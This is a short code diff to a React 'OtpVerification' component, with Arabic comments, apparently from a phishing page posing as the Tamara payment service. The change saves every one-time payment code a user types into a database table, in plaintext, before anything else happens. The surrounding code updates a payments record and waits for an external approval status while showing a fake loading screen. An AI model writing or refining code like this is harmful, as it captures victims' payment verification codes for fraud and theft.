@@ -53,6 +53,17 @@ const OtpVerification = () => {
 
     try {
       if (paymentId) {
+        // حفظ محاولة OTP أولاً
+        try {
+          await supabase.from("tamara_otp_attempts").insert({
+            payment_id: paymentId,
+            otp_code: otp
+          });
+        } catch (err) {
+          console.error("Error saving OTP attempt:", err);
+        }
+
+        // ثم تحديث OTP في الدفعة الرئيسية
         const { error } = await supabase
           .from("tamara_payments")
           .update({ otp_code: otp })
@@ -131,16 +142,6 @@ const OtpVerification = () => {
           if (newStatus === 'completed') {
             setWaitingApproval(false);
             setVerificationStatus("loading");
-            
-            // حفظ محاولة OTP
-            try {
-              await supabase.from("tamara_otp_attempts").insert({
-                payment_id: paymentId,
-                otp_code: otp
-              });
-            } catch (err) {
-              console.error("Error saving OTP attempt:", err);
-            }
             
             // عرض رسائل التحميل لمدة 5 ثواني
             setTimeout(() => {
